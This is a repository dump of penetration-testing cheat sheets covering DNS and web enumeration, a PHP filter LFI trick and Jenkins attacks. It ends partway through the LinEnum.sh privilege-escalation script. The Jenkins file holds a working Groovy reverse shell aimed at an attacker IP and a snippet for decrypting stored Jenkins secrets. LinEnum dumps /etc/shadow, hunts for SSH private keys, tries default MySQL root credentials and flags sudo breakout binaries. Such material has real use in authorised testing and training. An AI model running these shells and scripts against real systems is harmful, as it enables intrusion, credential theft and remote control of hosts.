Directory Structure:

└── ./
    ├── .idea
    │   └── .gitignore
    ├── CheatSheets
    │   ├── DNS
    │   │   └── readme.md
    │   ├── encode
    │   │   └── readme.md
    │   ├── enum
    │   │   └── readme.md
    │   ├── jenkins
    │   │   └── readme.md
    │   ├── LFI
    │   │   └── readme.md
    │   ├── linux
    │   │   ├── pos_xpl
    │   │   │   ├── LinEnum.sh
    │   │   │   └── readme.md
    │   │   └── priv_esc
    │   │       └── readme.md
    │   ├── MSSQL
    │   │   └── readme.md
    │   ├── mysql
    │   │   └── readme.md
    │   ├── NetBIOS
    │   │   └── readme.md
    │   ├── netcat
    │   │   └── readme.md
    │   ├── NFS
    │   │   └── readme.md
    │   ├── nmap
    │   │   └── README.md
    │   ├── pass_the_hash
    │   │   └── readme.md
    │   ├── pivoting
    │   │   └── readme.md
    │   ├── RCE
    │   │   └── README.md
    │   ├── RDP
    │   │   └── readme.md
    │   ├── RPC
    │   │   └── readme.md
    │   ├── shell
    │   │   └── readme.md
    │   ├── SMTP
    │   │   └── readme.md
    │   ├── SNMP
    │   │   └── readme.md
    │   ├── SQLI
    │   │   ├── barehands
    │   │   │   └── readme.md
    │   │   └── sqlmap
    │   │       └── readme.md
    │   ├── ssh
    │   │   └── readme.md
    │   ├── webmin
    │   │   └── readme.md
    │   ├── windows
    │   │   ├── enumaration
    │   │   │   └── readme.md
    │   │   ├── hashdump
    │   │   │   └── readme.md
    │   │   └── priv_esc
    │   │       ├── Invoke-MS16-032.ps1
    │   │       ├── readme.md
    │   │       └── WinPrivCheck.bat
    │   ├── XSS
    │   │   └── readme.md
    │   ├── 28533648.png
    │   └── grep.md
    ├── contribution.md
    └── README.md



---
File: /.idea/.gitignore
---

# Default ignored files
/shelf/
/workspace.xml
# Editor-based HTTP Client requests
/httpRequests/
# Datasource local storage ignored files
/dataSources/
/dataSources.local.xml



---
File: /CheatSheets/DNS/readme.md
---

# DNS Enumaration

## Nslookup

Resolve a given hostname to the corresponding IP.

`nslookup targetorganization.com`

## Reverse DNS lookup

`nslookup -type=PTR IP_address`

## MX(Mail Exchange) lookup 

`nslookup -type=MX domain`

## Zone Transfer

### Using nslookup Command

`nslookup`
`server domain.com`
`ls -d domain.com`

### Using HOST Command

host -t ns(Name Server) < domain >

`host -t ns domain.com`

after that test nameservers

host -l < domain >  < nameserver >

`host -l domain.com ns2.domain.com`

### Nmap Dns Enumaration

`nmap -F --dns-server <dns server ip> <target ip range>`

## Auto tools

### DNSenum

`dnsenum targetdomain.com`

`dnsenum --target_domain_subs.txt -v -f dns.txt -u a -r targetdomain.com`

### DNSmap

`dnsmap targetdomain.com`

`dnsmap targetdomain.com -w <Wordlst file.txt>`

Brute Force, the file is saved in /tmp

`dnsmap targetdomain.com -r`

### DNSRecon DNS Brute Force

`dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml`

### Fierce.pl

`fierce -dns targetdomain.com`

### HostMap

`hostmap.rb -only-passive -t <IP>`

We can use -with-zonetransfer or -bruteforce-level

### Online Tools

* https://dnsdumpster.com/
* https://network-tools.com/nslook/
* https://www.dnsqueries.com/en/
* https://mxtoolbox.com/


---
File: /CheatSheets/encode/readme.md
---

# Web encode to read PHP files

## Burpsuit encode Trick

GET /?page='php://filter/convert.base64-encode/resource'=<Page to read>

`GET /?page=php://filter/convert.base64-encode/resource=config`

After this you can use decode from burpsuit or 'base64 -d' from linux terminal.



---
File: /CheatSheets/enum/readme.md
---

# Web Enumeration

## Dirb

Default wordlist

`dirb http://target_site.com`

Wordlist 

`dirb http://target_site.com /usr/share/wordlist/dirbuster/WORDLIST`

Extensions

`dirb http://target_site.com -X .php,.txt,.bak,.old`

## Gobuster

`gobuster -w /usr/share/wordlists/dirb/common.txt -u TARGET`

## Nikto

`nikto -h TARGET`

`nikto -useproxy http://PROXY:3128 -h TARGET`

## UNISCAN

`uniscan -qweds -u http://TARGET.com`




---
File: /CheatSheets/jenkins/readme.md
---

# Jenkins

## Reverse Shell via Jenkins

Go to Jenkins script console:

`https://target-jenkins/script`

Execute the following `Groovy` script to send you the reverse shell on port 8080:
```
String host="ATTACKERS-IP-HERE";
int port=8080;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

> Don't forget setting you listener before run the script

## Decoding a Jenkins encripted password

Go to Jenkins script console:

`https://target-jenkins/script`

Execute the following `Groovy` script to decode the encripted information

```
hashed_pw='{ENC_PASS_HERE}'
passwd = hudson.util.Secret.decrypt(hashed_pw)
println(passwd)
```



---
File: /CheatSheets/LFI/readme.md
---

# LFI PHP

### Situation

`http://<target>/index.php?parameter=value`

### Test

`http://<target>/index.php?parameter=php://filter/convert.base64-encode/resource=index`

### Take a look at the bloody thing




---
File: /CheatSheets/linux/pos_xpl/LinEnum.sh
---

#!/bin/bash
#A script to enumerate local information from a Linux host
v="version 0.6"
#@rebootuser

#help function
usage ()
{
echo -e "\n\e[00;31m#########################################################\e[00m"
echo -e "\e[00;31m#\e[00m" "\e[00;33mLocal Linux Enumeration & Privilege Escalation Script\e[00m" "\e[00;31m#\e[00m"
echo -e "\e[00;31m#########################################################\e[00m"
echo -e "\e[00;33m# www.rebootuser.com | @rebootuser \e[00m"
echo -e "\e[00;33m# $v\e[00m\n"
echo -e "\e[00;33m# Example: ./LinEnum.sh -k keyword -r report -e /tmp/ -t \e[00m\n"

		echo "OPTIONS:"
		echo "-k	Enter keyword"
		echo "-e	Enter export location"
		echo "-t	Include thorough (lengthy) tests"
		echo "-r	Enter report name"
		echo "-h	Displays this help text"
		echo -e "\n"
		echo "Running with no options = limited scans/no output file"

echo -e "\e[00;31m#########################################################\e[00m"
}
while getopts "h:k:r:e:t" option; do
 case "${option}" in
	  k) keyword=${OPTARG};;
	  r) report=${OPTARG}"-"`date +"%d-%m-%y"`;;
	  e) export=${OPTARG};;
	  t) thorough=1;;
	  h) usage; exit;;
	  *) usage; exit;;
 esac
done

echo -e "\n\e[00;31m#########################################################\e[00m" |tee -a $report 2>/dev/null
echo -e "\e[00;31m#\e[00m" "\e[00;33mLocal Linux Enumeration & Privilege Escalation Script\e[00m" "\e[00;31m#\e[00m" |tee -a $report 2>/dev/null
echo -e "\e[00;31m#########################################################\e[00m" |tee -a $report 2>/dev/null
echo -e "\e[00;33m# www.rebootuser.com\e[00m" |tee -a $report 2>/dev/null
echo -e "\e[00;33m# $version\e[00m\n" |tee -a $report 2>/dev/null

echo "Debug Info" |tee -a $report 2>/dev/null

if [ "$keyword" ]; then
	echo "keyword = $keyword" |tee -a $report 2>/dev/null
else
	:
fi

if [ "$report" ]; then
	echo "report name = $report" |tee -a $report 2>/dev/null
else
	:
fi

if [ "$export" ]; then
	echo "export location = $export" |tee -a $report 2>/dev/null
else
	:
fi

if [ "$thorough" ]; then
	echo "thorough tests = enabled" |tee -a $report 2>/dev/null
else
	echo "thorough tests = disabled" |tee -a $report 2>/dev/null
fi

sleep 2

if [ "$export" ]; then
  mkdir $export 2>/dev/null
  format=$export/LinEnum-export-`date +"%d-%m-%y"`
  mkdir $format 2>/dev/null
else
  :
fi

who=`whoami` 2>/dev/null |tee -a $report 2>/dev/null
echo -e "\n" |tee -a $report 2>/dev/null

echo -e "\e[00;33mScan started at:"; date |tee -a $report 2>/dev/null
echo -e "\e[00m\n" |tee -a $report 2>/dev/null

echo -e "\e[00;33m### SYSTEM ##############################################\e[00m" |tee -a $report 2>/dev/null

#basic kernel info
unameinfo=`uname -a 2>/dev/null`
if [ "$unameinfo" ]; then
  echo -e "\e[00;31mKernel information:\e[00m\n$unameinfo" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

procver=`cat /proc/version 2>/dev/null`
if [ "$procver" ]; then
  echo -e "\e[00;31mKernel information (continued):\e[00m\n$procver" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#search all *-release files for version info
release=`cat /etc/*-release 2>/dev/null`
if [ "$release" ]; then
  echo -e "\e[00;31mSpecific release information:\e[00m\n$release" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#target hostname info
hostnamed=`hostname 2>/dev/null`
if [ "$hostnamed" ]; then
  echo -e "\e[00;31mHostname:\e[00m\n$hostnamed" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

echo -e "\e[00;33m### USER/GROUP ##########################################\e[00m" |tee -a $report 2>/dev/null

#current user details
currusr=`id 2>/dev/null`
if [ "$currusr" ]; then
  echo -e "\e[00;31mCurrent user/group info:\e[00m\n$currusr" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#last logged on user information
lastlogedonusrs=`lastlog 2>/dev/null |grep -v "Never" 2>/dev/null`
if [ "$lastlogedonusrs" ]; then
  echo -e "\e[00;31mUsers that have previously logged onto the system:\e[00m\n$lastlogedonusrs" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi


#who else is logged on
loggedonusrs=`w 2>/dev/null`
if [ "$loggedonusrs" ]; then
  echo -e "\e[00;31mWho else is logged on:\e[00m\n$loggedonusrs" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#lists all id's and respective group(s)
grpinfo=`for i in $(cat /etc/passwd 2>/dev/null| cut -d":" -f1 2>/dev/null);do id $i;done 2>/dev/null`
if [ "$grpinfo" ]; then
  echo -e "\e[00;31mGroup memberships:\e[00m\n$grpinfo" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#checks to see if any hashes are stored in /etc/passwd (depreciated  *nix storage method)
hashesinpasswd=`grep -v '^[^:]*:[x]' /etc/passwd 2>/dev/null`
if [ "$hashesinpasswd" ]; then
  echo -e "\e[00;33mIt looks like we have password hashes in /etc/passwd!\e[00m\n$hashesinpasswd" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#locate custom user accounts with some 'known default' uids
readpasswd=`grep -v "^#" /etc/passwd | awk -F: '$3 == 0 || $3 == 500 || $3 == 501 || $3 == 502 || $3 == 1000 || $3 == 1001 || $3 == 1002 || $3 == 2000 || $3 == 2001 || $3 == 2002 { print }'`
if [ "$readpasswd" ]; then
  echo -e "\e[00;31mSample entires from /etc/passwd (searching for uid values 0, 500, 501, 502, 1000, 1001, 1002, 2000, 2001, 2002):\e[00m\n$readpasswd" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

if [ "$export" ] && [ "$readpasswd" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/passwd $format/etc-export/passwd 2>/dev/null
else
  :
fi

#checks to see if the shadow file can be read
readshadow=`cat /etc/shadow 2>/dev/null`
if [ "$readshadow" ]; then
  echo -e "\e[00;33m***We can read the shadow file!\e[00m\n$readshadow" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

if [ "$export" ] && [ "$readshadow" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/shadow $format/etc-export/shadow 2>/dev/null
else
  :
fi

#checks to see if /etc/master.passwd can be read - BSD 'shadow' variant
readmasterpasswd=`cat /etc/master.passwd 2>/dev/null`
if [ "$readmasterpasswd" ]; then
  echo -e "\e[00;33m***We can read the master.passwd file!\e[00m\n$readmasterpasswd" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

if [ "$export" ] && [ "$readmasterpasswd" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/master.passwd $format/etc-export/master.passwd 2>/dev/null
else
  :
fi

#all root accounts (uid 0)
echo -e "\e[00;31mSuper user account(s):\e[00m" | tee -a $report 2>/dev/null; grep -v -E "^#" /etc/passwd 2>/dev/null| awk -F: '$3 == 0 { print $1}' 2>/dev/null |tee -a $report 2>/dev/null
echo -e "\n" |tee -a $report 2>/dev/null

#pull out vital sudoers info
sudoers=`cat /etc/sudoers 2>/dev/null | grep -v -e '^$' 2>/dev/null |grep -v "#" 2>/dev/null`
if [ "$sudoers" ]; then
  echo -e "\e[00;31mSudoers configuration (condensed):\e[00m$sudoers" | tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

if [ "$export" ] && [ "$sudoers" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/sudoers $format/etc-export/sudoers 2>/dev/null
else
  :
fi

#can we sudo without supplying a password
sudoperms=`echo '' | sudo -S -l 2>/dev/null`
if [ "$sudoperms" ]; then
  echo -e "\e[00;33mWe can sudo without supplying a password!\e[00m\n$sudoperms" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#known 'good' breakout binaries
sudopwnage=`echo '' | sudo -S -l 2>/dev/null | grep -w 'nmap\|perl\|'awk'\|'find'\|'bash'\|'sh'\|'man'\|'more'\|'less'\|'vi'\|'emacs'\|'vim'\|'nc'\|'netcat'\|python\|ruby\|lua\|irb' | xargs -r ls -la 2>/dev/null`
if [ "$sudopwnage" ]; then
  echo -e "\e[00;33m***Possible Sudo PWNAGE!\e[00m\n$sudopwnage" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#checks to see if roots home directory is accessible
rthmdir=`ls -ahl /root/ 2>/dev/null`
if [ "$rthmdir" ]; then
  echo -e "\e[00;33m***We can read root's home directory!\e[00m\n$rthmdir" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#displays /home directory permissions - check if any are lax
homedirperms=`ls -ahl /home/ 2>/dev/null`
if [ "$homedirperms" ]; then
  echo -e "\e[00;31mAre permissions on /home directories lax:\e[00m\n$homedirperms" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#looks for files we can write to that don't belong to us
if [ "$thorough" = "1" ]; then
  grfilesall=`find / -writable -not -user \`whoami\` -type f -not -path "/proc/*" -exec ls -al {} \; 2>/dev/null`
  if [ "$grfilesall" ]; then
    echo -e "\e[00;31mFiles not owned by user but writable by group:\e[00m\n$grfilesall" |tee -a $report 2>/dev/null
    echo -e "\n" |tee -a $report 2>/dev/null
  else
    :
  fi
fi

#looks for world-reabable files within /home - depending on number of /home dirs & files, this can take some time so is only 'activated' with thorough scanning switch
if [ "$thorough" = "1" ]; then
wrfileshm=`find /home/ -perm -4 -type f -exec ls -al {} \; 2>/dev/null`
	if [ "$wrfileshm" ]; then
		echo -e "\e[00;31mWorld-readable files within /home:\e[00m\n$wrfileshm" |tee -a $report 2>/dev/null
		echo -e "\n" |tee -a $report 2>/dev/null
	else
		:
	fi
  else
	:
fi

if [ "$thorough" = "1" ]; then
	if [ "$export" ] && [ "$wrfileshm" ]; then
		mkdir $format/wr-files/ 2>/dev/null
		for i in $wrfileshm; do cp --parents $i $format/wr-files/ ; done 2>/dev/null
	else
		:
	fi
  else
	:
fi

#lists current user's home directory contents
if [ "$thorough" = "1" ]; then
homedircontents=`ls -ahl ~ 2>/dev/null`
	if [ "$homedircontents" ] ; then
		echo -e "\e[00;31mHome directory contents:\e[00m\n$homedircontents" |tee -a $report 2>/dev/null
		echo -e "\n" |tee -a $report 2>/dev/null
	else
		:
	fi
  else
	:
fi

#checks for if various ssh files are accessible - this can take some time so is only 'activated' with thorough scanning switch
if [ "$thorough" = "1" ]; then
sshfiles=`find / \( -name "id_dsa*" -o -name "id_rsa*" -o -name "known_hosts" -o -name "authorized_hosts" -o -name "authorized_keys" \) -exec ls -la {} 2>/dev/null \;`
	if [ "$sshfiles" ]; then
		echo -e "\e[00;31mSSH keys/host information found in the following locations:\e[00m\n$sshfiles" |tee -a $report 2>/dev/null
		echo -e "\n" |tee -a $report 2>/dev/null
	else
		:
	fi
  else
  :
fi

if [ "$thorough" = "1" ]; then
	if [ "$export" ] && [ "$sshfiles" ]; then
		mkdir $format/ssh-files/ 2>/dev/null
		for i in $sshfiles; do cp --parents $i $format/ssh-files/; done 2>/dev/null
	else
		:
	fi
  else
	:
fi

#is root permitted to login via ssh
sshrootlogin=`grep "PermitRootLogin " /etc/ssh/sshd_config 2>/dev/null | grep -v "#" | awk '{print  $2}'`
if [ "$sshrootlogin" = "yes" ]; then
  echo -e "\e[00;31mRoot is allowed to login via SSH:\e[00m" |tee -a $report 2>/dev/null; grep "PermitRootLogin " /etc/ssh/sshd_config 2>/dev/null | grep -v "#" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

echo -e "\e[00;33m### ENVIRONMENTAL #######################################\e[00m" |tee -a $report 2>/dev/null

#env information
envinfo=`env 2>/dev/null | grep -v 'LS_COLORS' 2>/dev/null`
if [ "$envinfo" ]; then
  echo -e "\e[00;31m Environment information:\e[00m\n$envinfo" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#current path configuration
pathinfo=`echo $PATH 2>/dev/null`
if [ "$pathinfo" ]; then
  echo -e "\e[00;31mPath information:\e[00m\n$pathinfo" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#lists available shells
shellinfo=`cat /etc/shells 2>/dev/null`
if [ "$shellinfo" ]; then
  echo -e "\e[00;31mAvailable shells:\e[00m\n$shellinfo" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#current umask value with both octal and symbolic output
umask=`umask -S 2>/dev/null & umask 2>/dev/null`
if [ "$umask" ]; then
  echo -e "\e[00;31mCurrent umask value:\e[00m\n$umask" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#umask value as in /etc/login.defs
umaskdef=`cat /etc/login.defs 2>/dev/null |grep -i UMASK 2>/dev/null |grep -v "#" 2>/dev/null`
if [ "$umaskdef" ]; then
  echo -e "\e[00;31mumask value as specified in /etc/login.defs:\e[00m\n$umaskdef" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#password policy information as stored in /etc/login.defs
logindefs=`cat /etc/login.defs 2>/dev/null | grep "PASS_MAX_DAYS\|PASS_MIN_DAYS\|PASS_WARN_AGE\|ENCRYPT_METHOD" 2>/dev/null | grep -v "#" 2>/dev/null`
if [ "$logindefs" ]; then
  echo -e "\e[00;31mPassword and storage information:\e[00m\n$logindefs" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

if [ "$export" ] && [ "$logindefs" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/login.defs $format/etc-export/login.defs 2>/dev/null
else
  :
fi

echo -e "\e[00;33m### JOBS/TASKS ##########################################\e[00m" |tee -a $report 2>/dev/null

#are there any cron jobs configured
cronjobs=`ls -la /etc/cron* 2>/dev/null`
if [ "$cronjobs" ]; then
  echo -e "\e[00;31mCron jobs:\e[00m\n$cronjobs" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#can we manipulate these jobs in any way
cronjobwwperms=`find /etc/cron* -perm -0002 -type f -exec ls -la {} \; -exec cat {} 2>/dev/null \;`
if [ "$cronjobwwperms" ]; then
  echo -e "\e[00;33m***World-writable cron jobs and file contents:\e[00m\n$cronjobwwperms" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#contab contents
crontab=`cat /etc/crontab 2>/dev/null`
if [ "$crontab" ]; then
  echo -e "\e[00;31mCrontab contents:\e[00m\n$crontab" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

crontabvar=`ls -la /var/spool/cron/crontabs 2>/dev/null`
if [ "$crontabvar" ]; then
  echo -e "\e[00;31mAnything interesting in /var/spool/cron/crontabs:\e[00m\n$crontabvar" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

anacronjobs=`ls -la /etc/anacrontab 2>/dev/null; cat /etc/anacrontab 2>/dev/null`
if [ "$anacronjobs" ]; then
  echo -e "\e[00;31mAnacron jobs and associated file permissions:\e[00m\n$anacronjobs" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

anacrontab=`ls -la /var/spool/anacron 2>/dev/null`
if [ "$anacrontab" ]; then
  echo -e "\e[00;31mWhen were jobs last executed (/var/spool/anacron contents):\e[00m\n$anacrontab" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#pull out account names from /etc/passwd and see if any users have associated cronjobs (priv command)
cronother=`cat /etc/passwd | cut -d ":" -f 1 | xargs -n1 crontab -l -u 2>/dev/null`
if [ "$cronother" ]; then
  echo -e "\e[00;31mJobs held by all users:\e[00m\n$cronother" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

echo -e "\e[00;33m### NETWORKING  ##########################################\e[00m" |tee -a $report 2>/dev/null

#nic information
nicinfo=`/sbin/ifconfig -a 2>/dev/null`
if [ "$nicinfo" ]; then
  echo -e "\e[00;31mNetwork & IP info:\e[00m\n$nicinfo" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

arpinfo=`arp -a 2>/dev/null`
if [ "$arpinfo" ]; then
  echo -e "\e[00;31mARP history:\e[00m\n$arpinfo" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#dns settings
nsinfo=`cat /etc/resolv.conf 2>/dev/null | grep "nameserver"`
if [ "$nsinfo" ]; then
  echo -e "\e[00;31mNameserver(s):\e[00m\n$nsinfo" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#default route configuration
defroute=`route 2>/dev/null | grep default`
if [ "$defroute" ]; then
  echo -e "\e[00;31mDefault route:\e[00m\n$defroute" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#listening TCP
tcpservs=`netstat -antp 2>/dev/null`
if [ "$tcpservs" ]; then
  echo -e "\e[00;31mListening TCP:\e[00m\n$tcpservs" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#listening UDP
udpservs=`netstat -anup 2>/dev/null`
if [ "$udpservs" ]; then
  echo -e "\e[00;31mListening UDP:\e[00m\n$udpservs" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

echo -e "\e[00;33m### SERVICES #############################################\e[00m" |tee -a $report 2>/dev/null

#running processes
psaux=`ps aux 2>/dev/null`
if [ "$psaux" ]; then
  echo -e "\e[00;31mRunning processes:\e[00m\n$psaux" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#lookup process binary path and permissisons
procperm=`ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null`
if [ "$procperm" ]; then
  echo -e "\e[00;31mProcess binaries & associated permissions (from above list):\e[00m\n$procperm" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

if [ "$export" ] && [ "$procperm" ]; then
procpermbase=`ps aux 2>/dev/null | awk '{print $11}' | xargs -r ls 2>/dev/null | awk '!x[$0]++' 2>/dev/null`
  mkdir $format/ps-export/ 2>/dev/null
  for i in $procpermbase; do cp --parents $i $format/ps-export/; done 2>/dev/null
else
  :
fi

#anything 'useful' in inetd.conf
inetdread=`cat /etc/inetd.conf 2>/dev/null`
if [ "$inetdread" ]; then
  echo -e "\e[00;31mContents of /etc/inetd.conf:\e[00m\n$inetdread" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

if [ "$export" ] && [ "$inetdread" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/inetd.conf $format/etc-export/inetd.conf 2>/dev/null
else
  :
fi

#very 'rough' command to extract associated binaries from inetd.conf & show permisisons of each
inetdbinperms=`cat /etc/inetd.conf 2>/dev/null | awk '{print $7}' |xargs -r ls -la 2>/dev/null`
if [ "$inetdbinperms" ]; then
  echo -e "\e[00;31mThe related inetd binary permissions:\e[00m\n$inetdbinperms" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

xinetdread=`cat /etc/xinetd.conf 2>/dev/null`
if [ "$xinetdread" ]; then
  echo -e "\e[00;31mContents of /etc/xinetd.conf:\e[00m\n$xinetdread" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

if [ "$export" ] && [ "$xinetdread" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/xinetd.conf $format/etc-export/xinetd.conf 2>/dev/null
else
  :
fi

xinetdincd=`cat /etc/xinetd.conf 2>/dev/null |grep "/etc/xinetd.d" 2>/dev/null`
if [ "$xinetdincd" ]; then
  echo -e "\e[00;31m/etc/xinetd.d is included in /etc/xinetd.conf - associated binary permissions are listed below:\e[00m" ls -la /etc/xinetd.d 2>/dev/null |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#very 'rough' command to extract associated binaries from xinetd.conf & show permisisons of each
xinetdbinperms=`cat /etc/xinetd.conf 2>/dev/null | awk '{print $7}' |xargs -r ls -la 2>/dev/null`
if [ "$xinetdbinperms" ]; then
  echo -e "\e[00;31mThe related xinetd binary permissions:\e[00m\n$xinetdbinperms" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

initdread=`ls -la /etc/init.d 2>/dev/null`
if [ "$initdread" ]; then
  echo -e "\e[00;31m/etc/init.d/ binary permissions:\e[00m\n$initdread" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#init.d files NOT belonging to root!
initdperms=`find /etc/init.d/ \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$initdperms" ]; then
  echo -e "\e[00;31m/etc/init.d/ files not belonging to root (uid 0):\e[00m\n$initdperms" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

rcdread=`ls -la /etc/rc.d/init.d 2>/dev/null`
if [ "$rcdread" ]; then
  echo -e "\e[00;31m/etc/rc.d/init.d binary permissions:\e[00m\n$rcdread" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#init.d files NOT belonging to root!
rcdperms=`find /etc/rc.d/init.d \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$rcdperms" ]; then
  echo -e "\e[00;31m/etc/rc.d/init.d files not belonging to root (uid 0):\e[00m\n$rcdperms" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

usrrcdread=`ls -la /usr/local/etc/rc.d 2>/dev/null`
if [ "$usrrcdread" ]; then
  echo -e "\e[00;31m/usr/local/etc/rc.d binary permissions:\e[00m\n$usrrcdread" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#rc.d files NOT belonging to root!
usrrcdperms=`find /usr/local/etc/rc.d \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$usrrcdperms" ]; then
  echo -e "\e[00;31m/usr/local/etc/rc.d files not belonging to root (uid 0):\e[00m\n$usrrcdperms" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

echo -e "\e[00;33m### SOFTWARE #############################################\e[00m" |tee -a $report 2>/dev/null

#sudo version - check to see if there are any known vulnerabilities with this
sudover=`sudo -V 2>/dev/null| grep "Sudo version" 2>/dev/null`
if [ "$sudover" ]; then
  echo -e "\e[00;31mSudo version:\e[00m\n$sudover" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#mysql details - if installed
mysqlver=`mysql --version 2>/dev/null`
if [ "$mysqlver" ]; then
  echo -e "\e[00;31mMYSQL version:\e[00m\n$mysqlver" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#checks to see if root/root will get us a connection
mysqlconnect=`mysqladmin -uroot -proot version 2>/dev/null`
if [ "$mysqlconnect" ]; then
  echo -e "\e[00;33m***We can connect to the local MYSQL service with default root/root credentials!\e[00m\n$mysqlconnect" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#mysql version details
mysqlconnectnopass=`mysqladmin -uroot version 2>/dev/null`
if [ "$mysqlconnectnopass" ]; then
  echo -e "\e[00;33m***We can connect to the local MYSQL service as 'root' and without a password!\e[00m\n$mysqlconnectnopass" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

#postgres details - if installed
postgver=`psql -V 2>/dev/null`
if [ "$postgver" ]; then
  echo -e "\e[00;31mPostgres version:\e[00m\n$postgver" |tee -a $report 2>/dev/null
  echo -e "\n" |tee -a $report 2>/dev/null
else
  :
fi

